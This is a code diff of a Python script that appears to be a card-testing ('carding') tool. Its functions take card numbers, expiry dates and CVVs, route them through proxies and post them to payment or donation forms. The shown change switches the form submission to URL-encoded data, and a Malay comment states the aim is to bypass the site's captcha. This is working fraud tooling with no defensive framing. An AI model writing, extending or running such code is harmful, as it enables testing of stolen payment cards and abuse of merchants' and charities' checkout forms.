@@ -88,7 +88,8 @@ def create_session(proxy_url=None):
         "Sec-Fetch-Dest": "document",
         "Sec-Fetch-Mode": "navigate",
         "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-User": "?1"
+        "Sec-Fetch-User": "?1",
+        "Content-Type": "application/x-www-form-urlencoded"
     }
         
     session.headers.update(headers)
@@ -266,7 +267,6 @@ def process_site_for_payload(url, override_proxy=None):
     return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 def extract_confirmation_form(html, soup):
-    # Cari form yang ada input name="_qf_Confirm_next"
     confirm_form = soup.find('form', {'id': 'Confirm'})
     if not confirm_form:
         for form in soup.find_all('form'):
@@ -359,8 +359,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 if '?' in post_url: post_url += f'&qfKey={qfkey}'
                 else: post_url += f'?qfKey={qfkey}'
 
-            # GUNA MULTIPART FORM DATA SUPAYA &amp; TAK DICONVERT
-            response = session.post(post_url, files=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
+            # GUNA DATA= SUPAYA APPLICATION/X-WWW-FORM-URLENCODED DIGUNA PAKAI (BYPASS CAPTCHA)
+            response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
             
